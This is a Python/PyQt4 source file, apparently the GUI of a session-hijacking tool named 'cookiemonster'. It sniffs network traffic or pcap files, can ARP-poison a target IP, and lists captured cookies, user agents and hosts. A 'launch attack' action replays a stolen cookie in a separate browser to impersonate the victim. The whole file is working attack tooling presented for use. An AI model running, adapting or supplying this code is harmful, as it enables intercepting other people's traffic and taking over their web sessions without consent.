#!/usr/bin/python
# -*- coding: utf-8 -*-
# this bitch is GPL
import sys
import subprocess
import urllib
import time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *
from PyQt4.QtNetwork import *
import thread
from MonsterCore import MonsterCore
from multiprocessing import Queue, Pipe, Process
from subprocess import Popen
import getopt
from ModelUtil import CookieModel
import re
import os
import platform
from MacMonsterCore import MacMonsterCore
import MonsterLogger


class MonsterGui(QMainWindow):

    def __init__(self):
        super(MonsterGui, self).__init__()
        self.cookieWidget = QTreeView()
        self.cookieWidget.setContextMenuPolicy(Qt.CustomContextMenu)
        self.actions = [QAction("launch attack", self.cookieWidget), QAction(
            "stop monitor(Mac Only)", self.cookieWidget), QAction("resume monitor(Mac Only)", self.cookieWidget)]
        self.connect(self.actions[0], SIGNAL("triggered()"), self.launchAttack)
        self.connect(self.actions[1], SIGNAL("triggered()"), self.stopMonitor)
        self.connect(self.actions[2], SIGNAL(
            "triggered()"), self.resumeMonitor)
        self.connect(self.cookieWidget, SIGNAL(
            "customContextMenuRequested(QPoint)"), self.showMenu)
        self.model = CookieModel()
        self.cookieWidget.setModel(self.model)
        self.setCentralWidget(self.cookieWidget)
        self.setUnifiedTitleAndToolBarOnMac(True)

    def showMenu(self, point):
        index = self.cookieWidget.indexAt(point)
        if index.isValid() and self.cookieWidget.model().nodeFromIndex(index).isUA():
            QMenu.exec_(self.actions, self.cookieWidget.mapToGlobal(point))

    def incoming(self, infos, cookie, ua):
        self.model.addCookie(infos, cookie, ua)
        MonsterLogger.printJuicyCookie(
            "ua: %s cookie %s host %s" % (ua, cookie, infos[2]))
        self.cookieWidget.expandAll()

    def launchAttack(self):

        index = self.cookieWidget.selectedIndexes()[0]
        model = self.cookieWidget.model()
        ua = model.data(index)
        cookie = model.data(index.parent())
        host = model.data(index.parent().parent())
        Popen(["python", "MonsterBrowser.py", "-u", ua, "-c", cookie, host])

        # self.Monster.attack(host,cookie,ua)

    def resumeMonitor(self):
        if isinstance(self.Monster, MacMonsterCore) and not self.Monster.isRunning():
            self.Monster.resumeMonitor()
            self.Monster.start()

    def stopMonitor(self):
        self.Monster.stopMonitor()

    def closeEvent(self, event):
        quit_msg = "Are you sure you want to exit the program?"
        reply = QMessageBox.question(self, 'Message',
                                     quit_msg, QMessageBox.Yes, QMessageBox.No)

        if reply == QMessageBox.Yes:
            self.stopMonitor()
            event.accept()
        else:
            event.ignore()

    def usage(self):
        print """
    Usage: python cookiemonster.py [options] [capture source]

    Options:
        -a  --arp <IP>        Perform ARP poisoning on IP (in progress)

    File / Interface
        -i --interface <interface>    Choose specified interface
        -f --file <filename>         Choose specified filename
        -c --channel <channel>      Choose specified channel (For Mac OS X only)
        """

    def getArguments(self, argv):
        try:
            opts, args = getopt.getopt(argv, "a:i:f:c:", [
                                       "arp=", "interface=", "file=", "channel="])
        except getopt.GetoptError:
            self.usage()
            sys.exit(2)

        check = False

        filename = False
        interface = False
        arp_target = False
        channel = None

        for opt, args in opts:
                if opt in ("-f", "--file"):
                    filename = args

                if opt in ("-i", "--interface"):
                    interface = args

                if opt in ("-a", "--arp"):
                    arp_target = args
                    if not self.validateIP(args):
                        print "Please enter a valid IP address"
                        sys.exit(2)
                if opt in ("-c", "--channel"):
                    channel = args

        if not interface and not filename:
            self.usage()
            sys.exit(2)

        if interface and filename:
            MonsterLogger.logger.error(
                "You cannot specify a filename AND an interface")
            self.usage()
            sys.exit(2)

        if platform.system() == "Darwin":
            # mac os x
            MonsterLogger.logger.info(
                "Mac OS X detected, switching to workaround using airpcap")
            if channel is None:
                MonsterLogger.logger.info(
                    "No channel specified on Mac OS X, fallback to local sniffing")
                self.Monster = MonsterCore(filename, interface, arp_target)
            else:
                self.Monster = MacMonsterCore(
                    filename, interface, arp_target, channel)
        else:
            self.Monster = MonsterCore(filename, interface, arp_target)

        self.connect(self.Monster, SIGNAL("cookieFound"), self.incoming)
        self.Monster.start()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    monster = MonsterGui()
    monster.getArguments(sys.argv[1:])
    monster.resize(1024, 768)
    monster.show()
    app.exec_()
